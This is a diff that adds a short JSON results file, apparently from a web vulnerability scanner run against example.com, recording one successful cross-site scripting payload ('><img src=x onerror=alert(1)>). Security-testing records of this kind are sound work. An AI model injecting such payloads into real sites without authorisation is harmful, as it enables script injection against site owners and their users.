@@ -1,0 +1,13 @@
+{
+  "target": "https://example.com",
+  "timestamp": "2025-05-15 17:42:54",
+  "results": [
+    {
+      "payload": "'><img src=x onerror=alert(1)>",
+      "success": true,
+      "signature": {
+        "vector": "XSS"
+      }
+    }
+  ]
+}
